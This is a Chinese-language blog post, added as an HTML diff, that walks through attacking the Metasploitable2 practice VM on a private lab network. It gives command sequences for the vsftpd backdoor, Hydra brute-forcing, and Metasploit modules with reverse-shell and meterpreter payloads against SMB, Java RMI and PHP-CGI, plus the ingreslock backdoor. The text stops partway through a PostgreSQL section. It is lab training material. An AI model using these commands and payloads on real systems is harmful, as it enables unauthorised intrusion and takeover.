@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="stackTang"/><meta name="copyright" content="stackTang"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="技巧,靶场"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="Metasploitable2靶机漏洞详解 | stackTang Blog"/><meta name="apple-mobile-web-app-title" content="Metasploitable2靶机漏洞详解 | stackTang Blog"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2026/06/22/Metasploitable2靶机漏洞详解/"/><meta name="description" content="704日志[toc] Metasploitable2靶机漏洞详解:靶机IP：192.168.209.153kali: 192.168.209.129扫描结果： 漏洞清单：    端口&#x2F;服务 端口&#x2F;服务    21 &#x2F; ftp弱口令(vsf234笑脸漏洞) 445 &#x2F; 已测试   22 &#x2F; ssh弱口令 512 &#x2F; rlogin Rl...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploitable2靶机漏洞详解 | stackTang Blog">
+<meta property="og:url" content="http://example.com/2026/06/22/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="stackTang Blog">
+<meta property="og:description" content="704日志[toc] Metasploitable2靶机漏洞详解:靶机IP：192.168.209.153kali: 192.168.209.129扫描结果： 漏洞清单：    端口&#x2F;服务 端口&#x2F;服务    21 &#x2F; ftp弱口令(vsf234笑脸漏洞) 445 &#x2F; 已测试   22 &#x2F; ssh弱口令 512 &#x2F; rlogin Rl...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/06/22/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/assets/images/Hexo-Theme-MEOW.png">
+<meta property="article:published_time" content="2026-06-22T12:48:39.000Z">
+<meta property="article:modified_time" content="2026-06-22T13:01:42.245Z">
+<meta property="article:author" content="stackTang">
+<meta property="article:tag" content="技巧">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/06/22/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>Metasploitable2靶机漏洞详解 | stackTang Blog</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/waline.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 8.1.2"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>stackTang Blog</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">stackTang Blog</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-aside-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-aside-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">StackTang の 站</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">Metasploitable2靶机漏洞详解</h1><div class="post-author"><span>作者: stackTang</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2026-06-22</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-06-22</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><a class="post-tags-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></span></div></div></div><div class="post markdown" indent="false"><h1 id="704日志"><a href="#704日志" class="headerlink" title="704日志"></a>704日志</h1><p>[toc]</p>
+<h2 id="Metasploitable2靶机漏洞详解"><a href="#Metasploitable2靶机漏洞详解" class="headerlink" title="Metasploitable2靶机漏洞详解:"></a>Metasploitable2靶机漏洞详解:</h2><p>靶机IP：192.168.209.153<br>kali: 192.168.209.129<br>扫描结果：<br><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20093126.png"  alt="saomiao"></p>
+<p>漏洞清单：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="center">端口&#x2F;服务</th>
+<th align="center">端口&#x2F;服务</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">21 &#x2F; ftp弱口令(vsf234笑脸漏洞)</td>
+<td align="center">445 &#x2F; 已测试</td>
+</tr>
+<tr>
+<td align="center">22 &#x2F; ssh弱口令</td>
+<td align="center">512 &#x2F; rlogin Rlogin 后门漏洞</td>
+</tr>
+<tr>
+<td align="center">23 &#x2F;telnet弱口令</td>
+<td align="center">513 &#x2F; rlogin Rlogin 后门漏洞</td>
+</tr>
+<tr>
+<td align="center">25 -smtp邮件服务</td>
+<td align="center">514 &#x2F; rlogin Rlogin 后门漏洞</td>
+</tr>
+<tr>
+<td align="center">53 -BIND拒绝服务漏洞</td>
+<td align="center">1099 &#x2F; java_rmi_server</td>
+</tr>
+<tr>
+<td align="center">80 - php_cgi</td>
+<td align="center">1524 msfable 后门</td>
+</tr>
+<tr>
+<td align="center">111 -rpcbind漏洞</td>
+<td align="center">2049 &#x2F; NFS共享漏洞</td>
+</tr>
+<tr>
+<td align="center">139 &#x2F; smb</td>
+<td align="center">2121 -</td>
+</tr>
+<tr>
+<td align="center">3306 &#x2F; 空密码</td>
+<td align="center">5900 &#x2F; VNC</td>
+</tr>
+<tr>
+<td align="center">5432 &#x2F; postgresql</td>
+<td align="center">6667 &#x2F; unreal_ircd</td>
+</tr>
+<tr>
+<td align="center">6000 -x服务</td>
+<td align="center">8009</td>
+</tr>
+<tr>
+<td align="center">6697 &#x2F; unreal_ircd</td>
+<td align="center">8180&#x2F;tomcat5.5</td>
+</tr>
+</tbody></table></div>
+<h3 id="21笑脸漏洞"><a href="#21笑脸漏洞" class="headerlink" title="21笑脸漏洞"></a>21笑脸漏洞</h3><p>有两种方法，一种是瑞士军刀,一种使用msfconsole</p>
+<h4 id="第一种瑞士军刀nc"><a href="#第一种瑞士军刀nc" class="headerlink" title="第一种瑞士军刀nc"></a>第一种瑞士军刀nc</h4><p>kali输入</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.209.153 </span><br><span class="line"><span class="comment">#输入root:)  密码随意</span></span><br><span class="line"><span class="comment">#就开启6200端口</span></span><br><span class="line"><span class="comment">#另外开一个终端输入</span></span><br><span class="line">nc 192.168.209.153 6200</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment">#获取root权限</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20093700.png"  alt="smile"></p>
+<h4 id="第二种msfconsole"><a href="#第二种msfconsole" class="headerlink" title="第二种msfconsole"></a>第二种msfconsole</h4><p>kali开启msfconsole</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search vsf <span class="comment">#搜索笑脸漏洞</span></span><br><span class="line">use 0 <span class="comment">#选择第0个攻击载荷</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.209.153 <span class="comment">#设置攻击目标地址</span></span><br><span class="line">show payloads <span class="comment">#展示攻击载荷</span></span><br><span class="line">use 0 <span class="comment">#使用第0个攻击</span></span><br><span class="line">run <span class="comment">#执行载荷</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20100040.png" ></p>
+<h3 id="22ssh服务-23telnet弱口令"><a href="#22ssh服务-23telnet弱口令" class="headerlink" title="22ssh服务&#x2F;23telnet弱口令"></a>22ssh服务&#x2F;23telnet弱口令</h3><p>使用九头蛇或者msf进行爆破</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t ip  ssh -s 22   </span><br><span class="line">-L 指定用户字典文件 </span><br><span class="line">-P 指定密码字典文件  </span><br><span class="line">-o 把成功的输出到ssh.txt文件 </span><br><span class="line">-vV 显示详细信息  </span><br><span class="line">-s 指定其他端口 如果要修改默认22端口，可以使用 -s 参数</span><br><span class="line"><span class="comment">#小写为固定用户名或者密码</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>(ps:暴力破解取决于密码本，在此不做演示)</p>
+<h3 id="111-rpcbind漏洞"><a href="#111-rpcbind漏洞" class="headerlink" title="111-rpcbind漏洞"></a>111-rpcbind漏洞</h3><p>该漏洞可使攻击者在远程rpcbind绑定主机上分配任意大小的内存(每次攻击最高可达4GB)，除非进程崩溃，或者管理员挂起&#x2F;重启rpcbind服务，否则该内存不会被释放。<br>使用metasploit(msf)验证漏洞</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/misc/sunrpc_portmapper</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS  192.168.26.28</span><br><span class="line">run</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search sunrpc</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>(ps:危害大就不演示了)</p>
+<h3 id="80Apache-PHP-CGI查询字符串参数漏洞"><a href="#80Apache-PHP-CGI查询字符串参数漏洞" class="headerlink" title="80Apache(PHP-CGI查询字符串参数漏洞)"></a>80Apache(PHP-CGI查询字符串参数漏洞)</h3><p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20102738.png" ><br>server api cgi 猜测有php-cgi漏洞</p>
+<p>使用msf</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search php_cgi</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.209.153</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>获取shell权限<br><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20103703.png" ></p>
+<h3 id="139-445-Smb服务漏洞"><a href="#139-445-Smb服务漏洞" class="headerlink" title="139&#x2F;445 Smb服务漏洞"></a>139&#x2F;445 Smb服务漏洞</h3><div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search smb</span><br><span class="line">use 8</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.209.153</span><br><span class="line"><span class="built_in">set</span> payload cmd/unix/reverse</span><br><span class="line">run</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20105433.png" ></p>
+<h3 id="1099-Java反序列化命令执行漏洞-cve-2011-3556"><a href="#1099-Java反序列化命令执行漏洞-cve-2011-3556" class="headerlink" title="1099 Java反序列化命令执行漏洞(cve-2011-3556)"></a>1099 Java反序列化命令执行漏洞(cve-2011-3556)</h3><div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search java_rmi</span><br><span class="line">use 1</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.209.153</span><br><span class="line"><span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20111400.png" ></p>
+<h3 id="1524-“ingreslock”后门"><a href="#1524-“ingreslock”后门" class="headerlink" title="1524 “ingreslock”后门"></a>1524 “ingreslock”后门</h3><p>终端输入：</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.209.153 1524</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20111811.png" ></p>
+<h3 id="3306-MySQL-爆破-空密码"><a href="#3306-MySQL-爆破-空密码" class="headerlink" title="3306 MySQL 爆破&amp;空密码"></a>3306 MySQL 爆破&amp;空密码</h3><p>(ps:不演示)</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.209.153 -P 3306 -u root -p</span><br><span class="line"><span class="comment">#-p+密码</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<h3 id="5432端口postgresq爆破"><a href="#5432端口postgresq爆破" class="headerlink" title="5432端口postgresq爆破"></a>5432端口postgresq爆破</h3><div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search postgres_login</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.209.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>使用kali进行进攻postgresql<br><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-03%20175357.png" ><br>如图获取账号与密码<br>另开终端连接</p>
